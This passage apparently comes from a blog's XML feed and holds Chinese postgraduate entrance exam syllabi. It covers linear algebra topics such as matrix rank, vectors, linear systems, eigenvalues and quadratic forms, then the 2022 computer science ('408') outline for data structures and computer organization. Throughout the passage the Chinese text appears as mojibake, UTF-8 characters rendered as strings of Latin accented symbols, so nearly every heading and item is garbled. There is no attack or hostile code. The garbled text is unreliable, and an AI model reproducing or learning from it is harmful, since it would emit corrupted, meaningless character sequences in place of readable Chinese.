<p>4.äº†è§£çŸ©é˜µåˆç­‰å˜æ¢çš„æ¦‚å¿µï¼Œäº†è§£åˆç­‰çŸ©é˜µçš„æ€§è´¨å’ŒçŸ©é˜µç­‰ä»·çš„æ¦‚å¿µï¼Œç†è§£çŸ©é˜µçš„ç§©çš„æ¦‚å¿µï¼ŒæŒæ¡ç”¨åˆç­‰å˜æ¢æ±‚çŸ©é˜µçš„ç§©å’Œé€†çŸ©é˜µçš„æ–¹æ³•.</p>
<p>5.äº†è§£åˆ†å—çŸ©é˜µåŠå…¶è¿ç®—.</p>
<h3 id="ä¸‰ã€å‘é‡"><a href="#ä¸‰ã€å‘é‡" class="headerlink" title="ä¸‰ã€å‘é‡"></a>ä¸‰ã€å‘é‡</h3><p>å‘é‡çš„æ¦‚å¿µã€å‘é‡çš„çº¿æ€§ç»„åˆå’Œçº¿æ€§è¡¨ç¤ºã€å‘é‡ç»„çš„çº¿æ€§ç›¸å…³ä¸çº¿æ€§æ— å…³ã€å‘é‡ç»„çš„æå¤§çº¿æ€§æ— å…³ç»„ã€ç­‰ä»·å‘é‡ç»„ã€å‘é‡ç»„çš„ç§©ã€å‘.é‡ç»„çš„ç§©ä¸çŸ©é˜µçš„ç§©ä¹‹é—´çš„å…³ç³»ã€å‘é‡çš„å†…ç§¯ã€çº¿æ€§æ— å…³å‘é‡ç»„çš„çš„æ­£äº¤è§„èŒƒåŒ–æ–¹æ³•.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£nç»´å‘é‡ã€å‘é‡çš„çº¿æ€§ç»„åˆä¸çº¿æ€§è¡¨ç¤ºçš„æ¦‚å¿µ.</p>
<p>2.ç†è§£å‘é‡ç»„çº¿æ€§ç›¸å…³ã€çº¿æ€§æ— å…³çš„æ¦‚å¿µï¼ŒæŒæ¡å‘é‡ç»„çº¿æ€§ç›¸å…³ã€çº¿æ€§æ— å…³çš„æœ‰å…³æ€§è´¨åŠåˆ¤åˆ«æ³•.</p>
<p>3.äº†è§£å‘é‡ç»„çš„æå¤§çº¿æ€§æ— å…³ç»„å’Œå‘é‡ç»„çš„ç§©çš„æ¦‚å¿µï¼Œä¼šæ±‚å‘é‡ç»„çš„æå¤§çº¿æ€§æ— å…³ç»„åŠç§©.</p>
<p>4.äº†è§£å‘é‡ç»„ç­‰ä»·çš„æ¦‚å¿µï¼Œäº†è§£çŸ©é˜µçš„ç§©ä¸å…¶è¡Œ(åˆ—)å‘é‡ç»„çš„ç§©çš„å…³ç³».</p>
<p>5.äº†è§£å†…ç§¯çš„æ¦‚å¿µï¼ŒæŒæ¡çº¿æ€§æ— å…³å‘é‡ç»„æ­£äº¤è§„èŒƒåŒ–çš„æ–½å¯†ç‰¹(Schmidt)æ–¹æ³•.</p>
<h3 id="å››ã€çº¿æ€§æ–¹ç¨‹ç»„"><a href="#å››ã€çº¿æ€§æ–¹ç¨‹ç»„" class="headerlink" title="å››ã€çº¿æ€§æ–¹ç¨‹ç»„"></a>å››ã€çº¿æ€§æ–¹ç¨‹ç»„</h3><p>çº¿æ€§æ–¹ç¨‹ç»„çš„å…‹æ‹‰é»˜(Cramer)æ³•åˆ™ã€é½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„æœ‰éé›¶è§£çš„å……åˆ†å¿…è¦æ¡ä»¶ã€éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„æœ‰è§£çš„å……åˆ†å¿…è¦æ¡ä»¶ã€çº¿æ€§æ–¹ç¨‹ç»„è§£çš„æ€§è´¨å’Œè§£çš„ç»“æ„ã€é½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„çš„åŸºç¡€è§£ç³»å’Œé€šè§£ã€éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„çš„é€šè§£.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ä¼šç”¨å…‹æ‹‰é»˜æ³•åˆ™.</p>
<p>2.ç†è§£é½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„æœ‰éé›¶è§£çš„å……åˆ†å¿…è¦æ¡ä»¶åŠéé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„æœ‰è§£çš„å……åˆ†å¿…è¦æ¡ä»¶.</p>
<p>3.ç†è§£é½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„çš„åŸºç¡€è§£ç³»åŠé€šè§£çš„æ¦‚å¿µ,æŒæ¡é½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„åŸºç¡€è§£ç³»å’Œé€šè§£çš„æ±‚æ³•.</p>
<p>4.ç†è§£éé½æ¬¡çº¿æ€§æ–¹ç¨‹ç»„çš„è§£çš„ç»“æ„åŠé€šè§£çš„æ¦‚å¿µ.</p>
<p>5.ä¼šç”¨åˆç­‰è¡Œå˜æ¢æ±‚è§£çº¿æ€§æ–¹ç¨‹ç»„.</p>
<h3 id="äº”ã€çŸ©é˜µçš„ç‰¹å¾å€¼åŠç‰¹å¾å‘é‡"><a href="#äº”ã€çŸ©é˜µçš„ç‰¹å¾å€¼åŠç‰¹å¾å‘é‡" class="headerlink" title="äº”ã€çŸ©é˜µçš„ç‰¹å¾å€¼åŠç‰¹å¾å‘é‡"></a>äº”ã€çŸ©é˜µçš„ç‰¹å¾å€¼åŠç‰¹å¾å‘é‡</h3><p>çŸ©é˜µçš„ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡çš„æ¦‚å¿µï¼Œæ€§è´¨ã€ç›¸ä¼¼çŸ©é˜µçš„æ¦‚å¿µåŠæ€§è´¨ã€çŸ©é˜µå¯ç›¸ä¼¼å¯¹è§’åŒ–çš„å……åˆ†å¿…è¦æ¡ä»¶ã€ç›¸ä¼¼å¯¹è§’çŸ©é˜µã€å®å¯¹ç§°çŸ©é˜µçš„ç‰¹å¾å€¼ã€ç‰¹å¾å‘é‡åŠå…¶ç›¸ä¼¼å¯¹è§’çŸ©é˜µ.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.ç†è§£çŸ©é˜µçš„ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡çš„æ¦‚å¿µåŠæ€§è´¨ï¼Œä¼šæ±‚çŸ©é˜µç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡.</p>
<p>2.ç†è§£ç›¸ä¼¼çŸ©é˜µçš„æ¦‚å¿µã€æ€§è´¨åŠçŸ©é˜µå¯ç›¸ä¼¼å¯¹è§’åŒ–çš„å……åˆ†å¿…è¦æ¡ä»¶ï¼Œä¼šå°†çŸ©é˜µåŒ–ä¸ºç›¸ä¼¼å¯¹è§’çŸ©é˜µ.</p>
<p>3.ç†è§£å®å¯¹ç§°çŸ©é˜µçš„ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡çš„æ€§è´¨.</p>
<h3 id="å…­ã€äºŒæ¬¡å‹"><a href="#å…­ã€äºŒæ¬¡å‹" class="headerlink" title="å…­ã€äºŒæ¬¡å‹"></a>å…­ã€äºŒæ¬¡å‹</h3><p>äºŒæ¬¡å‹åŠå…¶çŸ©é˜µè¡¨ç¤ºã€åˆåŒå˜æ¢ä¸åˆåŒçŸ©é˜µã€äºŒæ¬¡å‹çš„ç§©ã€æƒ¯æ€§å®šç†ã€äºŒæ¬¡å‹çš„æ ‡å‡†å½¢å’Œè§„èŒƒå½¢ã€ç”¨æ­£äº¤å˜æ¢å’Œé…æ–¹æ³•åŒ–äºŒæ¬¡å‹ä¸ºæ ‡å‡†å½¢ã€äºŒæ¬¡å‹åŠå…¶çŸ©é˜µçš„æ­£å®šæ€§.</p>
<p>è€ƒè¯•è¦æ±‚</p>
<p>1.äº†è§£äºŒæ¬¡å‹çš„æ¦‚å¿µï¼Œ ä¼šç”¨çŸ©é˜µå½¢å¼è¡¨ç¤ºäºŒæ¬¡å‹ï¼Œäº†è§£åˆåŒå˜æ¢ä¸åˆåŒçŸ©é˜µçš„æ¦‚å¿µ.</p>
<p>2.äº†è§£äºŒæ¬¡å‹çš„ç§©çš„æ¦‚å¿µï¼Œäº†è§£äºŒæ¬¡å‹çš„æ ‡å‡†å½¢ã€è§„èŒƒå½¢ç­‰æ¦‚å¿µï¼Œäº†è§£æƒ¯æ€§å®šç†ï¼Œä¼šç”¨æ­£äº¤å˜æ¢å’Œé…æ–¹æ³•åŒ–äºŒæ¬¡å‹ä¸ºæ ‡å‡†å½¢ã€‚</p>
<p>3.ç†è§£æ­£å®šäºŒæ¬¡å‹ã€æ­£å®šçŸ©é˜µçš„æ¦‚å¿µï¼Œå¹¶æŒæ¡å…¶åˆ¤åˆ«æ³•.</p>
]]></content>
      <categories>
        <category>æ•°å­¦</category>
      </categories>
      <tags>
        <tag>è€ƒç ”</tag>
        <tag>æ•°å­¦</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²</title>
    <url>/2021/10/20/%E8%80%83%E7%A0%94/2022%E5%B9%B4%E8%80%83%E7%A0%94408%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E7%A7%91%E8%80%83%E8%AF%95%E5%A4%A7%E7%BA%B2/</url>
    <content><![CDATA[<h1 id="2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²"><a href="#2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²" class="headerlink" title="2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²"></a>2022å¹´è€ƒç ”408è®¡ç®—æœºå­¦ç§‘è€ƒè¯•å¤§çº²</h1><blockquote>
<p><strong>å¶çº¯å®å®ä¸“ç”¨ç‰ˆ</strong></p>
</blockquote>
<p><strong>I è€ƒè¯•æ€§è´¨</strong></p>
<p>è®¡ç®—æœºå­¦ç§‘ä¸“ä¸šåŸºç¡€ç»¼åˆè€ƒè¯•æ˜¯ä¸ºé«˜ç­‰é™¢æ ¡å’Œç§‘ç ”é™¢æ‰€æ‹›æ”¶è®¡ç®—æœºç§‘å­¦ä¸ æŠ€æœ¯å­¦ç§‘çš„ç¡•å£«ç ”ç©¶ç”Ÿè€Œè®¾ç½®çš„å…·æœ‰é€‰æ‹”æ€§è´¨çš„è”è€ƒç§‘ç›®ï¼Œå…¶ç›®çš„æ˜¯ç§‘å­¦ã€å…¬å¹³ã€ æœ‰æ•ˆåœ°æµ‹è¯•è€ƒç”ŸæŒæ¡è®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯å­¦ç§‘å¤§å­¦æœ¬ç§‘é˜¶æ®µä¸“ä¸šçŸ¥è¯†ã€åŸºæœ¬ç†è®ºã€ åŸºæœ¬æ–¹æ³•çš„æ°´å¹³å’Œåˆ†æé—®é¢˜ã€è§£å†³é—®é¢˜çš„èƒ½åŠ›ï¼Œè¯„ä»·çš„æ ‡å‡†æ˜¯é«˜ç­‰é™¢æ ¡è®¡ç®—æœºç§‘ å­¦ä¸æŠ€æœ¯å­¦ç§‘ä¼˜ç§€æœ¬ç§‘æ¯•ä¸šç”Ÿæ‰€èƒ½è¾¾åˆ°çš„åŠæ ¼æˆ–åŠæ ¼ä»¥ä¸Šæ°´å¹³ï¼Œä»¥åˆ©äºå„é«˜ç­‰é™¢ æ ¡å’Œç§‘ç ”é™¢æ‰€æ‹©ä¼˜é€‰æ‹”ï¼Œç¡®ä¿ç¡•å£«ç ”ç©¶ç”Ÿçš„æ‹›ç”Ÿè´¨é‡ã€‚</p>
<p><strong>II è€ƒæŸ¥ç›®æ ‡</strong></p>
<p>è®¡ç®—æœºå­¦ç§‘ä¸“ä¸šåŸºç¡€ç»¼åˆè€ƒè¯•æ¶µç›–æ•°æ®ç»“æ„ã€è®¡ç®—æœºç»„æˆåŸç†ã€æ“ä½œç³»ç»Ÿå’Œ è®¡ç®—æœºç½‘ç»œç­‰å­¦ç§‘ä¸“ä¸šåŸºç¡€è¯¾ç¨‹ã€‚è¦æ±‚è€ƒç”Ÿæ¯”è¾ƒç³»ç»Ÿåœ°æŒæ¡ä¸Šè¿°ä¸“ä¸šåŸºç¡€è¯¾ç¨‹çš„ åŸºæœ¬æ¦‚å¿µã€åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•ï¼Œèƒ½å¤Ÿç»¼åˆè¿ç”¨æ‰€å­¦çš„åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•åˆ†æã€ åˆ¤æ–­å’Œè§£å†³æœ‰å…³ç†è®ºé—®é¢˜å’Œå®é™…é—®é¢˜ã€‚</p>
<p><strong>III è¯•å½¢å¼å’Œè¯•å·ç»“æ„</strong></p>
<p>ä¸€ã€è¯•å·æ»¡åˆ†åŠè€ƒè¯•æ—¶é—´</p>
<p>æœ¬è¯•å·æ»¡åˆ†ä¸º 150 åˆ†ï¼Œè€ƒè¯•æ—¶é—´ä¸º 180 åˆ†é’Ÿã€‚</p>
<p>äºŒã€ç­”é¢˜æ–¹å¼</p>
<p>ç­”é¢˜æ–¹å¼ä¸ºé—­å·ã€ç¬”è¯•ã€‚</p>
<p> ä¸‰ã€è¯•å·å†…å®¹ç»“æ„</p>
<p>æ•°æ®ç»“æ„ 45 åˆ†ã€è®¡ç®—æœºç»„æˆåŸç† 45 åˆ†ã€æ“ä½œç³»ç»Ÿ 35 åˆ†ã€è®¡ç®—æœºç½‘ç»œ 25 åˆ† </p>
<p>å››ã€è¯•å·é¢˜å‹ç»“æ„</p>
<p>å•é¡¹é€‰æ‹©é¢˜ 80 åˆ† (40 å°é¢˜ï¼Œæ¯å°é¢˜ 2 åˆ†)ã€ç»¼åˆåº”ç”¨é¢˜ 70 åˆ† </p>
<p><strong>IV è€ƒæŸ¥å†…å®¹</strong></p>
<h2 id="ã€æ•°æ®ç»“æ„ã€‘"><a href="#ã€æ•°æ®ç»“æ„ã€‘" class="headerlink" title="ã€æ•°æ®ç»“æ„ã€‘"></a><strong>ã€æ•°æ®ç»“æ„ã€‘</strong></h2><p><strong>ã€è€ƒæŸ¥ç›®æ ‡ã€‘</strong></p>
<p>1.æŒæ¡æ•°æ®ç»“æ„çš„åŸºæœ¬æ¦‚å¿µã€åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•ã€‚</p>
<p>2.æŒæ¡æ•°æ®çš„é€»è¾‘ç»“æ„ã€å­˜å‚¨ç»“æ„åŠåŸºæœ¬æ“ä½œçš„å®ç°ï¼Œèƒ½å¤Ÿå¯¹ç®—æ³•è¿›è¡ŒåŸºæœ¬ çš„æ—¶é—´å¤æ‚åº¦ä¸ç©ºé—´å¤æ‚åº¦çš„åˆ†æã€‚</p>
<p>3.èƒ½å¤Ÿè¿ç”¨æ•°æ®ç»“æ„åŸºæœ¬åŸç†å’Œæ–¹æ³•è¿›è¡Œé—®é¢˜çš„åˆ†æä¸æ±‚è§£ï¼Œå…·å¤‡é‡‡ç”¨ C æˆ– C++è¯­è¨€è®¾è®¡ä¸å®ç°ç®—æ³•çš„èƒ½åŠ›ã€‚</p>
<h3 id="ä¸€ã€çº¿æ€§è¡¨-çˆ±ä½ å“Ÿ"><a href="#ä¸€ã€çº¿æ€§è¡¨-çˆ±ä½ å“Ÿ" class="headerlink" title="ä¸€ã€çº¿æ€§è¡¨ çˆ±ä½ å“Ÿ"></a>ä¸€ã€çº¿æ€§è¡¨ çˆ±ä½ å“Ÿ</h3><p>(ä¸€)çº¿æ€§è¡¨çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>(äºŒ)çº¿æ€§è¡¨çš„å®ç°</p>
<p>1.é¡ºåºå­˜å‚¨</p>
<p>2.é“¾å¼å­˜å‚¨ </p>
<p>(ä¸‰)çº¿æ€§è¡¨çš„åº”ç”¨</p>
<h3 id="äºŒã€æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„"><a href="#äºŒã€æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„" class="headerlink" title="äºŒã€æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„"></a>äºŒã€æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„</h3><p> (ä¸€)æ ˆå’Œé˜Ÿåˆ—çš„åŸºæœ¬æ¦‚å¿µ</p>
<p> (äºŒ)æ ˆå’Œé˜Ÿåˆ—çš„é¡ºåºå­˜å‚¨ç»“æ„ </p>
<p>(ä¸‰)æ ˆå’Œé˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨ç»“æ„ </p>
<p>(å››)å¤šç»´æ•°ç»„çš„å­˜å‚¨ </p>
<p>(äº”)ç‰¹æ®ŠçŸ©é˜µçš„å‹ç¼©å­˜å‚¨</p>
<p> (å…­)æ ˆã€é˜Ÿåˆ—å’Œæ•°ç»„çš„åº”ç”¨</p>
<h3 id="ä¸‰ã€æ ‘ä¸äºŒå‰æ ‘"><a href="#ä¸‰ã€æ ‘ä¸äºŒå‰æ ‘" class="headerlink" title="ä¸‰ã€æ ‘ä¸äºŒå‰æ ‘"></a>ä¸‰ã€æ ‘ä¸äºŒå‰æ ‘</h3><p>(ä¸€)æ ‘çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>(äºŒ)äºŒå‰æ ‘</p>
<p>1.äºŒå‰æ ‘çš„å®šä¹‰åŠå…¶ä¸»è¦ç‰¹å¾</p>
<p>2.äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ç»“æ„å’Œé“¾å¼å­˜å‚¨ç»“æ„</p>
<p>3.äºŒå‰æ ‘çš„éå†</p>
<p>4.çº¿ç´¢äºŒå‰æ ‘çš„åŸºæœ¬æ¦‚å¿µå’Œæ„é€  </p>
<p>(ä¸‰) æ ‘ã€æ£®æ—</p>
<p>1.æ ‘çš„å­˜å‚¨ç»“æ„</p>
<p>2.æ£®æ—ä¸äºŒå‰æ ‘çš„è½¬æ¢</p>
<p>3.æ ‘å’Œæ£®æ—çš„éå† </p>
<p>(å››)æ ‘ä¸äºŒå‰æ ‘çš„åº”ç”¨</p>
<p>1.å“ˆå¤«æ›¼(Huffman)æ ‘å’Œå“ˆå¤«æ›¼ç¼–ç </p>
<p>2.å¹¶æŸ¥é›†åŠå…¶åº”ç”¨</p>
<h3 id="å››ã€å›¾"><a href="#å››ã€å›¾" class="headerlink" title="å››ã€å›¾"></a>å››ã€å›¾</h3><p>(ä¸€)å›¾çš„åŸºæœ¬æ¦‚å¿µ</p>
<p> (äºŒ)å›¾çš„å­˜å‚¨åŠåŸºæœ¬æ“ä½œ</p>
<p>1.é‚»æ¥çŸ©é˜µæ³•</p>
<p>2.é‚»æ¥è¡¨æ³•</p>
<p>3.é‚»æ¥å¤šé‡è¡¨ã€åå­—é“¾è¡¨ </p>
<p>(ä¸‰)å›¾çš„éå†</p>
<p>1.æ·±åº¦ä¼˜å…ˆæœç´¢</p>
<p>2.å¹¿åº¦ä¼˜å…ˆæœç´¢</p>
<p> (å››)å›¾çš„åŸºæœ¬åº”ç”¨</p>
<p>1.æœ€å°(ä»£ä»·)ç”Ÿæˆæ ‘</p>
<p>2.æœ€çŸ­è·¯å¾„</p>
<p>3.æ‹“æ‰‘æ’åº</p>
<p>4.å…³é”®è·¯å¾„ </p>
<h3 id="äº”ã€æŸ¥æ‰¾"><a href="#äº”ã€æŸ¥æ‰¾" class="headerlink" title="äº”ã€æŸ¥æ‰¾"></a>äº”ã€æŸ¥æ‰¾</h3><p>(ä¸€)æŸ¥æ‰¾çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>(äºŒ)é¡ºåºæŸ¥æ‰¾æ³• </p>
<p>(ä¸‰)åˆ†å—æŸ¥æ‰¾æ³• </p>
<p>(å››)æŠ˜åŠæŸ¥æ‰¾æ³•</p>
<p>(äº”)B æ ‘åŠå…¶åŸºæœ¬æ“ä½œã€B+æ ‘çš„åŸºæœ¬æ¦‚å¿µ </p>
<p>(å…­)æ•£åˆ—(Hash)è¡¨</p>
<p>(ä¸ƒ)æ ‘å‹æŸ¥æ‰¾ </p>
<p>1.äºŒå‰æœç´¢æ ‘</p>
<p>2.å¹³è¡¡äºŒå‰æ ‘</p>
<p>3.çº¢é»‘æ ‘ </p>
<h3 id="å…­ã€æ’åº"><a href="#å…­ã€æ’åº" class="headerlink" title="å…­ã€æ’åº"></a>å…­ã€æ’åº</h3><p>(ä¸€)æ’åºçš„åŸºæœ¬æ¦‚å¿µ</p>
<p> (äºŒ)æ’å…¥æ’åº</p>
<p>1.ç›´æ¥æ’å…¥æ’åº</p>
<p>2.æŠ˜åŠæ’å…¥æ’åº</p>
<p> (ä¸‰)æ°”æ³¡æ’åº(bubble sort) </p>
<p>(å››)ç®€å•é€‰æ‹©æ’åº </p>
<p>(äº”)å¸Œå°”æ’åº(shell sort)</p>
<p>(å…­)å¿«é€Ÿæ’åº</p>
<p> (ä¸ƒ)å †æ’åº</p>
<p>(å…«)äºŒè·¯å½’å¹¶æ’åº(merge sort) </p>
<p>(ä¹)åŸºæ•°æ’åº</p>
<p>(å)å¤–éƒ¨æ’åº </p>
<p>(åä¸€)æ’åºç®—æ³•çš„åˆ†æä¸åº”ç”¨</p>
<h2 id="ã€è®¡ç®—æœºç»„æˆåŸç†ã€‘"><a href="#ã€è®¡ç®—æœºç»„æˆåŸç†ã€‘" class="headerlink" title="ã€è®¡ç®—æœºç»„æˆåŸç†ã€‘"></a><strong>ã€è®¡ç®—æœºç»„æˆåŸç†ã€‘</strong></h2><p><strong>ã€è€ƒæŸ¥ç›®æ ‡ã€‘</strong></p>
<p>1.ç†è§£å•å¤„ç†å™¨è®¡ç®—æœºç³»ç»Ÿä¸­å„éƒ¨ä»¶çš„å†…éƒ¨å·¥ä½œåŸç†ã€ç»„æˆç»“æ„ä»¥åŠç›¸äº’è¿ æ¥æ–¹å¼ï¼Œå…·æœ‰å®Œæ•´çš„è®¡ç®—æœºç³»ç»Ÿçš„æ•´æœºæ¦‚å¿µã€‚</p>
<p>2.ç†è§£è®¡ç®—æœºç³»ç»Ÿå±‚æ¬¡åŒ–ç»“æ„æ¦‚å¿µï¼Œç†Ÿæ‚‰ç¡¬ä»¶ä¸è½¯ä»¶ä¹‹é—´çš„ç•Œé¢ï¼ŒæŒæ¡æŒ‡ä»¤ é›†ä½“ç³»ç»“æ„çš„åŸºæœ¬çŸ¥è¯†å’ŒåŸºæœ¬å®ç°æ–¹æ³•ã€‚</p>
<p>3.èƒ½å¤Ÿç»¼åˆè¿ç”¨è®¡ç®—æœºç»„æˆçš„åŸºæœ¬åŸç†å’ŒåŸºæœ¬æ–¹æ³•ï¼Œå¯¹æœ‰å…³è®¡ç®—æœºç¡¬ä»¶ç³»ç»Ÿ ä¸­çš„ç†è®ºå’Œå®é™…é—®é¢˜è¿›è¡Œè®¡ç®—ã€åˆ†æï¼Œå¯¹ä¸€äº›åŸºæœ¬éƒ¨ä»¶è¿›è¡Œç®€å•è®¾è®¡; å¹¶èƒ½å¯¹é«˜çº§ç¨‹åºè®¾è®¡è¯­è¨€(å¦‚ C è¯­è¨€)ä¸­çš„ç›¸å…³é—®é¢˜è¿›è¡Œåˆ†æã€‚</p>
<h3 id="ä¸€ã€è®¡ç®—æœºç³»ç»Ÿæ¦‚è¿°"><a href="#ä¸€ã€è®¡ç®—æœºç³»ç»Ÿæ¦‚è¿°" class="headerlink" title="ä¸€ã€è®¡ç®—æœºç³»ç»Ÿæ¦‚è¿°"></a>ä¸€ã€è®¡ç®—æœºç³»ç»Ÿæ¦‚è¿°</h3><p>(ä¸€)è®¡ç®—æœºç³»ç»Ÿå±‚æ¬¡ç»“æ„</p>
<p>1.è®¡ç®—æœºç³»ç»Ÿçš„åŸºæœ¬ç»„æˆ</p>
<p>2.è®¡ç®—æœºç¡¬ä»¶çš„åŸºæœ¬ç»“æ„</p>
<p>3.è®¡ç®—æœºè½¯ä»¶å’Œç¡¬ä»¶çš„å…³ç³»</p>
<p>4.è®¡ç®—æœºç³»ç»Ÿçš„å·¥ä½œåŸç† â€œå­˜å‚¨ç¨‹åºâ€å·¥ä½œæ–¹å¼ï¼Œé«˜çº§è¯­è¨€ç¨‹åºä¸æœºå™¨è¯­è¨€ç¨‹åºä¹‹é—´çš„è½¬æ¢,ç¨‹åº</p>
<p>å’ŒæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ </p>
<p>(äºŒ)è®¡ç®—æœºæ€§èƒ½æŒ‡æ ‡</p>
<p>ååé‡ã€å“åº”æ—¶é—´;CPU æ—¶é’Ÿå‘¨æœŸã€ä¸»é¢‘ã€CPIã€CPU æ‰§è¡Œæ—¶é—´;MIPSã€ MFLOPS ã€GFLOPSã€TFLOPSã€PFLOPSã€EFLOPSã€ZFLOPSã€‚</p>
<h3 id="äºŒã€æ•°æ®çš„è¡¨ç¤ºå’Œè¿ç®—"><a href="#äºŒã€æ•°æ®çš„è¡¨ç¤ºå’Œè¿ç®—" class="headerlink" title="äºŒã€æ•°æ®çš„è¡¨ç¤ºå’Œè¿ç®—"></a>äºŒã€æ•°æ®çš„è¡¨ç¤ºå’Œè¿ç®—</h3><p> (ä¸€)æ•°åˆ¶ä¸ç¼–ç   è¶…çº§çˆ±ä½ å“Ÿ</p>
<p>1.è¿›ä½è®¡æ•°åˆ¶åŠå…¶ç›¸äº’è½¬æ¢</p>
<p>2.çœŸå€¼å’Œæœºå™¨æ•°</p>
<p>3.å­—ç¬¦ä¸å­—ç¬¦ä¸²</p>
<p> (äºŒ)å®šç‚¹æ•°çš„è¡¨ç¤ºå’Œè¿ç®— </p>
<p>1.å®šç‚¹æ•°çš„è¡¨ç¤º</p>
<p>æ— ç¬¦å·æ•°çš„è¡¨ç¤º;æœ‰ç¬¦å·æ•´æ•°çš„è¡¨ç¤ºã€‚ </p>
<p>2.å®šç‚¹æ•°çš„è¿ç®—</p>
<p>å®šç‚¹æ•°çš„ä½ç§»è¿ç®—;åŸç å®šç‚¹æ•°çš„åŠ å‡è¿ç®—;è¡¥ç å®šç‚¹æ•°çš„åŠ &#x2F;å‡è¿ç®—; å®šç‚¹æ•°çš„ä¹˜&#x2F;é™¤è¿ç®—;æº¢å‡ºæ¦‚å¿µå’Œåˆ¤åˆ«æ–¹æ³•ã€‚</p>
<p>(ä¸‰)æµ®ç‚¹æ•°çš„è¡¨ç¤ºå’Œè¿ç®—</p>
<p>1.æµ®ç‚¹æ•°çš„è¡¨ç¤º IEEE 754 æ ‡å‡†</p>
<p>2.æµ®ç‚¹æ•°çš„åŠ &#x2F;å‡è¿ç®—</p>
<p> (å››)è¿ç®—æ–¹æ³•å’Œè¿ç®—ç”µè·¯ã€è¡¨è¿°å˜æ›´ã€‘</p>
<p>1.åŸºæœ¬è¿ç®—éƒ¨ä»¶ï¼šåŠ æ³•å™¨ã€ç®—æ•°é€»è¾‘éƒ¨ä»¶ ALU</p>
<p>2.å‡æ³•è¿ç®—ï¼šè¡¥ç åŠ å‡è¿ç®—å™¨ï¼Œæ ‡å¿—ä½çš„ç”Ÿæˆ</p>
<p>3.ä¹˜é™¤è¿ç®—ï¼šä¹˜é™¤è¿ç®—çš„åŸºæœ¬åŸç†ï¼Œä¹˜é™¤å‘ç”µè·¯çš„åŸºæœ¬ç»“æ„ </p>
<h3 id="ä¸‰ã€å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"><a href="#ä¸‰ã€å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„" class="headerlink" title="ä¸‰ã€å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„"></a>ä¸‰ã€å­˜å‚¨å™¨å±‚æ¬¡ç»“æ„</h3><p>(ä¸€)å­˜å‚¨å™¨çš„åˆ†ç±» </p>
<p>(äºŒ)å±‚æ¬¡åŒ–å­˜å‚¨å™¨çš„çš„åŸºæœ¬ç»“æ„</p>
<p> (ä¸‰)åŠå¯¼ä½“éšæœºå­˜å–å­˜å‚¨å™¨</p>
<p>1.SRAM å­˜å‚¨å™¨</p>
<p>2.DRAM å­˜å‚¨å™¨ 3.Flash å­˜å‚¨å™¨</p>
<p>(å››)ä¸»å­˜å‚¨å™¨</p>
<p>1.DRAM èŠ¯ç‰‡å’Œå†…å­˜æ¡</p>
<p>2.å¤šæ¨¡å—å­˜å‚¨å™¨</p>
<p>3.ä¸»å­˜å’Œ CPU ä¹‹é—´çš„è¿æ¥</p>
<p> (äº”)å¤–éƒ¨å­˜å‚¨å™¨</p>
<p>1.ç£ç›˜å­˜å‚¨å™¨</p>
<p>2.å›ºæ€ç¡¬ç›˜(SSD) </p>
<p>(å…­)é«˜é€Ÿç¼“å†²å­˜å‚¨å™¨(Cache)</p>
<p>1.Cache çš„åŸºæœ¬å·¥ä½œåŸç†</p>
<p>2.Cache å’Œä¸»å­˜ä¹‹é—´çš„æ˜ å°„æ–¹å¼</p>
<p>3.Cache ä¸­ä¸»å­˜å—çš„æ›¿æ¢ç®—æ³•</p>
<p> 4.Cache å†™ç­–ç•¥</p>
<p>(ä¸ƒ)è™šæ‹Ÿå­˜å‚¨å™¨ </p>
<p>1.è™šæ‹Ÿå­˜å‚¨å™¨çš„åŸºæœ¬æ¦‚å¿µ</p>
<p>2.é¡µå¼è™šæ‹Ÿå­˜å‚¨å™¨ åŸºæœ¬åŸç†ï¼Œé¡µè¡¨ï¼Œåœ°å€è½¬æ¢ï¼ŒTLB (å¿«è¡¨)ã€‚ </p>
<p>3.æ®µå¼è™šæ‹Ÿå­˜å‚¨å™¨</p>
<p>4.æ®µé¡µå¼è™šæ‹Ÿå­˜å‚¨å™¨ å››ã€æŒ‡ä»¤ç³»ç»Ÿ</p>
<p>(ä¸€)æŒ‡ä»¤ç³»ç»Ÿçš„åŸºæœ¬æ¦‚å¿µ</p>
<p>(äºŒ)æŒ‡ä»¤æ ¼å¼ </p>
